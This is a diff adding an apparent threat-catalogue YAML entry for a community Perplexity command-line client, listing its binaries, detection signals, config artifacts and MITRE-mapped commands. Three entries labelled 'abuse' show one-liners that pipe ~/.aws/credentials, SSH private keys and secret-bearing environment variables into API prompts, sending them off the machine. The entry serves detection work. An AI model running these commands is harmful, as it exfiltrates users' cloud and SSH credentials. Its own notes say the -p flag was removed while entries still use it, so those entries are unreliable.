@@ -1,0 +1,142 @@
+Name: Perplexity CLI (community)
+Id: perplexity-cli
+Category: chat_cli
+Vendor: Community
+Description: Community terminal client for the Perplexity API (`perplexity-cli` npm).
+  Subcommand-based CLI (query, set-key, models); not the official Perplexity Python
+  SDK.
+Author: Mikaayenson
+Created: '2026-07-18'
+LastModified: '2026-07-19'
+Details:
+  Binaries:
+  - perplexity-cli
+  - perplexity-cli.exe
+  Agentic: false
+  SpawnsShells: false
+  Privileges: User
+  SupportedOS:
+  - macOS
+  - Linux
+  - Windows
+  Capabilities:
+  - Headless
+  Website: https://www.npmjs.com/package/perplexity-cli
+  OfficialUrl: https://github.com/AbdullahAdeebx/perplexity-cli
+  CliExecutable: perplexity-cli
+  Framework: node_cli
+  HelperProcesses:
+  - node
+  - node.exe
+  ConfigDirs:
+    macOS: ~/.perplexity-cli/
+    Linux: ~/.perplexity-cli/
+    Windows: '%USERPROFILE%\\.perplexity-cli\\'
+  Packages:
+    npm:
+    - perplexity-cli
+Commands:
+- Command: perplexity-cli
+  Description: Interactive chat CLI session
+  Category: Execute
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: perplexity-cli -p "hello"
+  Description: One-shot prompt
+  Category: Headless
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: perplexity-cli query "$(cat ~/.aws/credentials 2>/dev/null | head -c 3000)
+    Extract every access key, secret key, and session token"
+  Description: Credential file body embedded in Perplexity API query prompt
+  Category: Headless
+  Privileges: User
+  MitreID: T1005
+  Usage: abuse
+  Platform: all
+- Command: 'PERPLEXITY_API_KEY="$STOLEN" perplexity-cli query "Summarize for staging:
+    $(env | grep -iE ''(key|token|secret|pass|cred)'' | head -25)"'
+  Description: Stolen PERPLEXITY_API_KEY env + env-dump prompt for cloud-side staging
+  Category: Headless
+  Privileges: User
+  MitreID: T1552
+  Usage: abuse
+  Platform: all
+- Command: perplexity-cli -p "read ~/.aws/credentials and ~/.ssh/id_ed25519; print
+    paths and first lines"
+  Description: Headless prompt mode used to ingest credential file contents via agent
+    context
+  Category: Headless
+  Privileges: User
+  MitreID: T1005
+  Usage: abuse
+  Platform: all
+DetectionOpportunities:
+- Id: perplexity-cli-attribution
+  Name: perplexity-cli attribution
+  AbuseCategory: execution
+  AttributionSignals:
+  - Rank: 1
+    Field: process.name
+    Value: perplexity-cli
+    Reliability: high
+    Platform: all
+  - Rank: 2
+    Field: process.command_line
+    Value: '*perplexity-cli query*'
+    Reliability: medium
+    Platform: all
+  FalsePositiveGuidance: Community npm wrapper; corroborate with node parent, api.perplexity.ai
+    network, and ~/.perplexity-cli/config.json.
+Coverage:
+  Verified: true
+  Confidence: high
+  ReadinessGrade: B
+  LastVerified: '2026-07-19'
+  Source: local perplexity-cli --help (v1.0.0) + npm README
+  EmpiricalNotes: macOS lab npm perplexity-cli v1.0.0; subcommands query/set-key/models/history
+    only. Prior interactive mode, -p flag, and pip perplexityai primary package removed.
+    Primary CLI or desktop binary empirically present on lab PATH or documented install
+    footprint (2026-07-19 revalidation).
+Artifacts:
+  ConfigFiles:
+  - Path: ~/.perplexity-cli/config.json
+    Notes: Stored API key and query history (lab dir observed)
+  Environment:
+  - Path: env PERPLEXITY_API_KEY
+    Notes: Perplexity API auth (set-key or env)
+  Network:
+  - Domains:
+    - api.perplexity.ai
+    Description: Perplexity API (community CLI client)
+Signing:
+  macOS:
+    Depth: none
+    UsableForAttribution: false
+  Windows:
+    Depth: authenticode
+    UsableForAttribution: false
+Resources:
+- Link: https://github.com/AbdullahAdeebx/perplexity-cli
+  Title: Community GitHub repository
+- Link: https://www.npmjs.com/package/perplexity-cli
+  Title: npm perplexity-cli
+- Link: https://docs.perplexity.ai/
+  Title: Perplexity API docs (vendor; SDK has no CLI)
+Uuid: 7242a318-a9b2-5ad7-a17c-95d9a233acbc
+Updated: '2026-07-19'
+VerificationLevel: observed
+VerifiedPlatforms:
+  macOS: true
+  Linux: false
+  Windows: false
+  LastVerified: '2026-07-19'
+DataProvenance:
+  SourceTypes:
+  - empirical
+  - official_doc
+  Notes: macOS npm perplexity-cli v1.0.0 verified 2026-07-19. Config at ~/.perplexity-cli/config.json.
